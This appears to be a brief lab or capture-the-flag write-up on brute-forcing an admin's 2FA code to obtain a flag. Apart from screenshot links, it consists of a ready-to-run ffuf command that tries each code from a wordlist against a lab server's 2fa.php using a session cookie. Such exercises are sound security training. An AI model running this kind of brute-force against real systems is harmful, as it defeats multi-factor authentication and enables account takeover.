# [Brute-Forcing 2FA Codes](Brute-Forcing%202FA%20Codes.md)
### Brute-force the admin user's 2FA code on the target system to obtain the flag.

![](Screenshot%202026-09-14%20at%2009.07.50.png)

Remember to change the value of PHPSESSID

```sh
ffuf -w ./tokens.txt -u http://154.57.164.82:31054//2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=05fukpmttqjnv182398795i208" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```
![](Screenshot%202026-09-14%20at%2009.10.41.png)
![](Screenshot%202026-09-14%20at%2009.11.10.png)